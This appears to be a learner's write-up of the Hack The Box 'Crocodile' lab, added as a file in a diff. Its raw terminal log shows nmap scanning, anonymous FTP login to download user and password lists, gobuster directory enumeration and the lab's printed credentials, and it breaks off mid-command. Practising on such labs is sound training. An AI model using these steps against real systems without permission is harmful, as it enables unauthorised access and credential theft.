@@ -1,0 +1,220 @@
+#URL/LINK
+https://app.hackthebox.com/machines/Crocodile?tab=play_machine
+
+
+#Concept
+Linux Hacking
+#Method of Solving
+i have got access to the ip address or machine and then i connected to it throught CLI After i managed to scan it using nmap command and then 
+switched to ftp and download all the allowed.userlist and passwd and i read them after i discovered that i can access http://10.129.18.19/login.php
+abd login as Admin boom and i addin my password from allowed.userlist.passwd
+
+#Command line 
+jason123@kali:~$ nmap -sV -sC 10.129.18.19
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:35 SAST
+Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 16:37 (0:00:00 remaining)
+Stats: 0:02:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 99.99% done; ETC: 16:37 (0:00:00 remaining)
+
+jason123@kali:~$ ping 10.129.18.19
+PING 10.129.18.19 (10.129.18.19) 56(84) bytes of data.
+64 bytes from 10.129.18.19: icmp_seq=1 ttl=63 time=208 ms
+64 bytes from 10.129.18.19: icmp_seq=2 ttl=63 time=205 ms
+64 bytes from 10.129.18.19: icmp_seq=3 ttl=63 time=248 ms
+64 bytes from 10.129.18.19: icmp_seq=4 ttl=63 time=201 ms
+^C
+--- 10.129.18.19 ping statistics ---
+5 packets transmitted, 4 received, 20% packet loss, time 4005ms
+rtt min/avg/max/mdev = 200.962/215.471/248.184/19.040 ms
+jason123@kali:~$ nmap -sV -sC 10.129.18.19
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:38 SAST
+Nmap scan report for 10.129.18.19
+Host is up (0.23s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.77
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text                                                                                                                               
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Smash - Bootstrap Business Template
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
+jason123@kali:~$ nmap -sV -sC -p- -T4 10.129.18.19
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:38 SAST
+Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 9.28% done; ETC: 16:48 (0:08:58 remaining)
+
+jason123@kali:~$ nmap -sV -sC -p  -T4 10.129.18.19
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:40 SAST
+Error #486: Your port specifications are illegal.  Example of proper form: "-100,200-1024,T:3000-4000,U:60000-"
+QUITTING!
+jason123@kali:~$ nmap -sV -sC -p21  -T4 10.129.18.19
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 16:40 SAST
+Nmap scan report for 10.129.18.19
+Host is up (0.27s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.77
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
+jason123@kali:~$ ftp 10.10.14.77
+ftp: Can't connect to `10.10.14.77:21': Connection refused
+ftp: Can't connect to `10.10.14.77:ftp'
+ftp> ls
+Not connected.
+ftp> ls
+ftp> bye
+jason123@kali:~$ ftp 10.129.18.19
+Connected to 10.129.18.19.
+220 (vsFTPd 3.0.3)
+Name (10.129.18.19:jason123): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||44120|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> get allowed.userlist
+local: allowed.userlist remote: allowed.userlist
+229 Entering Extended Passive Mode (|||48294|)
+150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
+100% |*************************************************************************************************************************|    33       10.31 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.15 KiB/s)
+ftp> bye 
+421 Timeout.
+jason123@kali:~$ cat allowed.userlist
+aron
+pwnmeow
+egotisticalsw
+admin
+jason123@kali:~$ cat admin
+cat: admin: No such file or directory
+jason123@kali:~$ cd  allowed.userlist
+bash: cd: allowed.userlist: Not a directory
+jason123@kali:~$ cat allowed.userlist
+aron
+pwnmeow
+egotisticalsw
+admin
+jason123@kali:~$ cat aron
+cat: aron: No such file or directory
+jason123@kali:~$ find aron
+find: ‘aron’: No such file or directory
+jason123@kali:~$ readme aron
+Command 'readme' not found, did you mean:
+  command 'readms' from deb casacore-tools
+  command 'readpe' from deb readpe
+Try: sudo apt install <deb name>
+jason123@kali:~$ gobuster dir -u http://10.129.18.19/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.18.19/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Extensions:              php,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.hta.txt             (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.129.18.19/assets/]
+/config.php           (Status: 200) [Size: 0]
+/css                  (Status: 301) [Size: 310] [--> http://10.129.18.19/css/]
+/dashboard            (Status: 301) [Size: 316] [--> http://10.129.18.19/dashboard/]
+/fonts                (Status: 301) [Size: 312] [--> http://10.129.18.19/fonts/]
+/index.html           (Status: 200) [Size: 58565]
+/js                   (Status: 301) [Size: 309] [--> http://10.129.18.19/js/]
+/login.php            (Status: 200) [Size: 1577]
+/logout.php           (Status: 302) [Size: 0] [--> login.php]
+/server-status        (Status: 403) [Size: 277]
+Progress: 13839 / 13839 (100.00%)
+===============================================================
+Finished
+===============================================================
+jason123@kali:~$ cat allowed.userlist.passwd
+cat: allowed.userlist.passwd: No such file or directory
+jason123@kali:~$ get allowed.userlist.passwd
+Command 'get' not found, but there are 16 similar ones.
+jason123@kali:~$ ftp 10.129.18.19
+Connected to 10.129.18.19.
+220 (vsFTPd 3.0.3)
+Name (10.129.18.19:jason123): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||42658|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
+-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
+226 Directory send OK.
+ftp> get allowed.userlist.passwd
+local: allowed.userlist.passwd remote: allowed.userlist.passwd
+229 Entering Extended Passive Mode (|||44890|)
+150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
+100% |*************************************************************************************************************************|    62      720.79 KiB/s    00:00 ETA
+226 Transfer complete.
+62 bytes received in 00:00 (0.30 KiB/s)
+ftp> bye
+221 Goodbye.
+jason123@kali:~$ get allowed.userlist.passwd
+Command 'get' not found, but there are 16 similar ones.
+jason123@kali:~$ cat  allowed.userlist.passwd
+root
+Supersecretpassword1
+@BaASD&9032123sADS
+rKXM59ESxesUFHAd
+jason123@kali:~$ cat  allowed.use
